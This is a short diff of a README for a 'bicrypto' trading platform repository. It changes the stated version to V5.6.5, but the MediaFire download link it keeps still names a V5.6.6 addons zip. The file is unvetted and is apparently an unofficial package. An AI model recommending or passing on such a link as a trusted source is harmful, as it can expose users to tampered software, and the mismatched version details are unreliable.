@@ -1,5 +1,5 @@
 # bicrypto-trading-platform
-bicrypto V5.6.6 +Addons new update + Mobileapp ios & android latest version V5:
+bicrypto V5.6.5 +Addons new update + Mobileapp ios & android latest version V5:
 must read readme file . download   :
 
 https://www.mediafire.com/file/ttk3dvexfzydwkq/BicryptoV5.6.6%252Baddons.zip/file
